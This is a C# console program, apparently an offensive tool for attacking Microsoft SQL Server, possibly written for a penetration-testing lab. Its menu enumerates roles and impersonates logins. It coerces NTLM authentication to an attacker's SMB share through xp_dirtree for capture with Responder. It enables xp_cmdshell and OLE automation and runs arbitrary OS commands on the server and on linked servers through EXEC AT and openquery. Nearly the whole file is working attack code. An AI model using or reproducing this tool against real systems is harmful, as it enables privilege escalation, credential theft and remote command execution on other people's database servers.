using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Net;

namespace MSSQLClient
{
	class Program
	{
		static SqlConnection con;
		
		private static void Pause()
        {
			Console.WriteLine("\nPress any key to continue...");
			//Console.ReadKey();
		}

		private static void RunQuery(bool tableOutput)
        {
			while (true)
            {
				Console.WriteLine("Enter SQL query to execute (Enter \"exit\" to go back to menu):");
				Console.Write("> ");
				String query = Console.ReadLine();

				if (query == "exit")
				{
					break;
				}

				var output = ExecuteQuery(query, tableOutput);
				if (!tableOutput)
                {
					Console.WriteLine($"Result:\n{output}");
				}
			}
		}
		private static void EnumerateCurrentUser()
        {
			Console.WriteLine("[-] Enumerating current user...");
			String user = ExecuteQuery("SELECT SYSTEM_USER");
			if (user.Length > 0)
            {
				Console.WriteLine($"[+] Logged in as: {user}");
			}
            else
            {
				Console.WriteLine("[!] Could not get current user. Check above error for details.");
            }

			String map = ExecuteQuery("SELECT USER_NAME()");
			if (map.Length > 0)
			{
				Console.WriteLine($"[+] Mapped to user: {map}");
			}
			else
			{
				Console.WriteLine("[!] Could not get user map. Check above error for details.");
			}

			CheckUserRole(user, "public");
			CheckUserRole(user, "sysadmin");

			Pause();
        }

		private static void CheckUserRole(string user, string roleName)
        {
            Int32.TryParse(ExecuteQuery($"SELECT IS_SRVROLEMEMBER('{roleName}')"), out int role);
            if (role == 1)
			{
				Console.WriteLine($"{user} is a member of {roleName} role");
			}
			else
			{
				Console.WriteLine($"{user} is NOT a member of {roleName} role");
			}
		}

		private static void ConnectToSMB()
        {
			Console.WriteLine("Enter SMB Share IP and share name (Example: \\\\192.168.x.x\\\\test):");
			Console.Write("> ");
			String smb = Console.ReadLine();

			ExecuteQuery($"EXEC master..xp_dirtree \"{smb}\"");
			Console.WriteLine("Check responder and above output for errors");
			Pause();
		}

		private static void GetLoginsForImpersonate()
        {
			Console.WriteLine("[-] Getting logins that can be impersonated...");
			String res = ExecuteQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'", true);
			Console.WriteLine($"[+] Logins that can be impersonated: {res}");
			Pause();
		}

		private static void ImpersonateLogin()
        {
			Console.WriteLine("Enter login to impersonate as:");
			Console.Write("> ");
			String login = Console.ReadLine();

			Console.WriteLine("[-] Triggering impersonation...");
			ExecuteQuery($"EXECUTE AS LOGIN = '{login}'");
			Console.WriteLine("[+] Check above output for errors. If none are present, enumerate the new login.");
			Pause();
		}

		private static void EnableCmdShell()
        {
			Console.WriteLine("[-] Enabling 'xp_cmdshell'...");
			ExecuteQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE");
			Console.WriteLine("[+] Enabled 'xp_cmdshell'");
			Pause();
		}

		private static void EnableOleAutoProcedures()
        {
			Console.WriteLine("[-] Enabling 'sp_oacreate'...");
			ExecuteQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE");
			Console.WriteLine("[+] Enabled 'sp_oacreate'");
			Pause();
		}

		private static void RunCmdCommand(bool useOle = false)
        {
			Console.WriteLine("Enter cmd command:");
			Console.Write("> ");
			String cmd = Console.ReadLine();

			Console.WriteLine("[-] Running cmd...");

			String result = "";
			if (useOle)
            {
				result = ExecuteQuery($"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{cmd}'");
			}
			else
            {
				result = ExecuteQuery($"EXEC xp_cmdshell '{cmd}'");
			}
			
			Console.WriteLine($"[+] Result:\n{result}");
			Pause();
		}

		private static void ListLinkedServers()
		{
			Console.WriteLine("[-] Fetching linked servers...");
			Console.WriteLine($"[+] Linked servers:\n");
			ExecuteQuery($"EXEC sp_linkedservers", true);
			Pause();
		}
		private static void GetLinkedServerInfo()
		{
			Console.WriteLine("Enter linked server name:");
			Console.Write("> ");
			String linkedServer = Console.ReadLine();

			Console.WriteLine($"[-] Fetching info for linked server {linkedServer}...");
			String result = ExecuteQuery($"select version from openquery(\"{linkedServer}\", 'select @@version as version')");
			Console.WriteLine($"[+] Linked server info:\n{result}");
			Pause();
		}
		private static void EnableCmdShellOnLinkedService()
		{
			Console.WriteLine("Enter linked services:");
			Console.Write("> ");
			String linkedService = Console.ReadLine();

			Console.WriteLine($"[-] Enabling advanced options on {linkedService}...");
			ExecuteQuery($"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT {linkedService}");

			Console.WriteLine($"[-] Enabling xp_cmdshell option on {linkedService}...");
			ExecuteQuery($"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT {linkedService}");

			Console.WriteLine("[+] Done");
			Pause();
		}

		private static void RunCmdCommandOnLinkedService()
		{
			Console.WriteLine("Enter linked services:");
			Console.Write("> ");
			String linkedService = Console.ReadLine();

			Console.WriteLine("Enter cmd command:");
			Console.Write("> ");
			String cmd = Console.ReadLine();

			Console.WriteLine("[-] Running cmd...");
			String result = ExecuteQuery($"EXEC ('xp_cmdshell ''{cmd}'';') AT {linkedService}");
			Console.WriteLine($"[+] Result:\n{result}");
			Pause();
		}

		private static void EnableCmdShellOnLinkedServiceViaOpenQuery()
		{
			Console.WriteLine("Enter linked services:");
			Console.Write("> ");
			String linkedService = Console.ReadLine();

			Console.WriteLine($"[-] Enabling advanced options on {linkedService} via openquery...");
			ExecuteQuery($"select 1 from openquery(\"{linkedService}\", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')");

			Console.WriteLine($"[-] Enabling xp_cmdshell option on {linkedService} via openquery...");
			ExecuteQuery($"select 1 from openquery(\"{linkedService}\", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')");

			Console.WriteLine("[+] Done");
			Pause();
		}

		private static void RunCmdCommandOnLinkedServiceViaOpenQuery()
		{
			Console.WriteLine("Enter linked services:");
			Console.Write("> ");
			String linkedService = Console.ReadLine();

			Console.WriteLine("Enter cmd command:");
			Console.Write("> ");
			String cmd = Console.ReadLine();

			Console.WriteLine("[-] Running cmd...");
			String result = ExecuteQuery($"select 1 from openquery(\"{linkedService}\", 'select 1; exec xp_cmdshell ''{cmd}''')");
			Console.WriteLine($"[+] Result:\n{result}");
			Pause();
		}

		private static bool MainMenu()
		{
			//Console.Clear();
			Console.WriteLine("Choose an option:");
			Console.WriteLine("1) Run query");
			Console.WriteLine("2) Run query with table output");
			Console.WriteLine("3) Enumerate current user");
			Console.WriteLine("4) Connect to SMB share");
			Console.WriteLine("5) Get logins for that can be impersonated");
			Console.WriteLine("6) Impersonate login");
			Console.WriteLine("7) Enable xp_cmdshell");
			Console.WriteLine("8) Enable sp_oacreate");
			Console.WriteLine("9) Run command via xp_cmdshell");
			Console.WriteLine("10) Run command via sp_oacreate");
			Console.WriteLine("11) List linked SQL servers");
			Console.WriteLine("12) Get linked SQL server info");
			Console.WriteLine("13) Enable xp_cmdshell on linked service");
			Console.WriteLine("14) Run cmd command on linked service");
			Console.WriteLine("15) Enable xp_cmdshell on linked service via openquery");
			Console.WriteLine("16) Run cmd command on linked service via openquery");
			Console.WriteLine("99) Exit");
			Console.WriteLine("\r\nSelect an option:");
			Console.Write("> ");

			string input = Console.ReadLine();
			if (!Int32.TryParse(input, out int choice) && input.ToLower() == "exit")
            {
				return false;
            }
			//Console.Clear();

			switch (choice)
			{
				case 1:
					RunQuery(false);
					return true;
				case 2:
					RunQuery(true);
					return true;
				case 3:
					EnumerateCurrentUser();
					return true;
				case 4:
					ConnectToSMB();
					return true;
				case 5:
					GetLoginsForImpersonate();
					return true;
				case 6:
					ImpersonateLogin();
					return true;
				case 7:
					EnableCmdShell();
					return true;
				case 8:
					EnableOleAutoProcedures();
					return true;
				case 9:
					RunCmdCommand(false);
					return true;
				case 10:
					RunCmdCommand(true);
					return true;
				case 11:
					ListLinkedServers();
					return true;
				case 12:
					GetLinkedServerInfo();
					return true;
				case 13:
					EnableCmdShellOnLinkedService();
					return true;
				case 14:
					RunCmdCommandOnLinkedService();
					return true;
				case 15:
					EnableCmdShellOnLinkedServiceViaOpenQuery();
					return true;
				case 16:
					RunCmdCommandOnLinkedServiceViaOpenQuery();
					return true;
				case 99:
					return false;
				default:
					return true;
			}
		}

		public static String ExecuteQuery(String query, bool ouputInTable = false)
		{
			try
			{
				SqlCommand cmd = new SqlCommand(query + ";", con);
				SqlDataReader reader = cmd.ExecuteReader();
				var table = new ConsoleTable();

				String result = "";
				var columns = new List<string>();

				if (ouputInTable)
                {
					// Print a table
					
					for (int i = 0; i < reader.FieldCount; i++)
					{
						// Get columns names
						columns.Add(reader.GetName(i));
						table.AddColumn(reader.GetName(i));
					}
				}

				// Read values
				while (reader.Read())
				{
					var values = new object[columns.Count];

					for (int i = 0; i < reader.FieldCount; i++)
					{
						result += $"{reader[i]} ";

						if (ouputInTable)
                        {
							values[i] = reader[i];
						}
					}

					result += "\n";

					if (ouputInTable)
                    {
						table.AddRow(values);
					}
				}
				reader.Close();

				if (ouputInTable)
				{
					table.Write();
					Console.WriteLine();
					return "";
				}
				
				return result;
			}
			catch (Exception e)
			{
				Console.WriteLine(e.ToString());
				return "";
			}
		}

		static void Main(string[] args)
		{
			String hostname = Dns.GetHostName();
			Console.WriteLine($"Enter db server (Example: dc03.corp1.com | Will use '{hostname}' if no input):");
			Console.Write("> ");
			String server = Console.ReadLine();
			if (server.Replace(" ", "").Replace("\n", "").Length == 0)
			{
				server = hostname;
			}

			String defaultDb = "master";
			Console.WriteLine($"Enter database name (Defaults to '{defaultDb}' if no input):");
			Console.Write("> ");
			String database = Console.ReadLine();
			if (database.Replace(" ", "").Replace("\n", "").Length == 0)
            {
				database = defaultDb;

			}

			Console.WriteLine("[-] Connecting to db...");
			String conString = $"Server = {server}; Database = {database}; Integrated Security = True;";
			con = new SqlConnection(conString);

			try
			{
				con.Open();
				Console.WriteLine($"[+] Connected to {database} on {server}");
			}
			catch
			{
				Console.WriteLine($"[!] Could not connec to {database} on {server}. Press any key to exit.");
				//Console.ReadKey();
				Environment.Exit(0);
			}

			bool showMenu = true;
			while (showMenu)
			{
				showMenu = MainMenu();
			}

			con.Close();
		}
	}
}